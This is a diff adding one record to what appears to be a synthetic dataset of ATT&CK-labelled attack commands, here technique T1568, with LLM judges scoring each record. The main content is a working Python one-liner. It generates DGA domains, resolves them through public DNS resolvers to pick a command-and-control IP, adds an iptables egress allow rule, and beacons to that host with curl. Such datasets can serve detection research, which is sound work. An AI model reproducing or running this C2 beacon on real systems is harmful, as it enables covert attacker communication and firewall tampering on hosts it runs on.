@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from collections import Counter; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='consensus'; tlds=['net','org','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:11]+'.'+tlds[i%len(tlds)] for i in range(n)]\nresolvers=['8.8.8.8','1.1.1.1','9.9.9.9']\ndom=None; ip=None; port=random.choice([8443,5359,16000])\nfor d in dga(20):\n    ips=[]\n    for r in resolvers:\n        resp=sr1(IP(dst=r)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n        if resp and resp[DNS] and resp[DNS].an:\n            for a in resp[DNS].an:\n                if getattr(a,'type',0)==1:\n                    ips.append(a.rdata)\n    if ips:\n        c=Counter(ips).most_common(1)[0]\n        if c[1]>=2:\n            dom=d; ip=c[0]; break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/ok','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Achieves dynamic C2 resolution by querying multiple resolvers and selecting an IP that appears in at least two answers to reduce poisoning/noise.",
+  "rationale_steps": [
+    "Generate a set of DGA domains for trial.",
+    "Query 3 public resolvers and collect A answers for each candidate.",
+    "Pick the IP with resolver consensus to stabilize dynamic selection.",
+    "Allowlist and probe the chosen irregular port at the resolved IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-a15b04ba",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The quoted Python one-liner is well-formed with balanced quotes, valid imports, correct indentation/newlines, and properly constructed subprocess calls and flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements a DGA and multi-resolver consensus to dynamically resolve a C2 endpoint and attempts a connection, but practical execution may falter without root for scapy/iptables and relies on attacker-registered DGA domains.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-02T07:37:49.273607Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command embeds a multi-line Python script in a single-line `-c` string with newlines represented as literal newlines inside the shell string, which will cause shell parsing issues unless properly escaped or quoted; the logic itself is syntactically valid Python but the shell invocation is fragile.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 DGA-based dynamic C2 resolution: it generates 20 daily-seeded SHA256-derived domain names, queries multiple resolvers via raw DNS packets (scapy), applies a consensus voting mechanism (≥2 resolvers agreeing) to select a C2 IP, dynamically picks a port, adds a firewall rule to permit egress, and beacons via HTTPS curl with domain-to-IP pinning — fully aligned with the described technique.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-19T00:29:25.322961Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is syntactically valid, utilizing proper imports, function definitions with internal logic, and balanced quotes/parentheses even when wrapped in a shell command.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a DGA with a sophisticated consensus mechanism across multiple resolvers; however, it requires root privileges for scapy raw packets and iptables, which contradicts the 'None' privilege metadata.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:29:35.407329Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
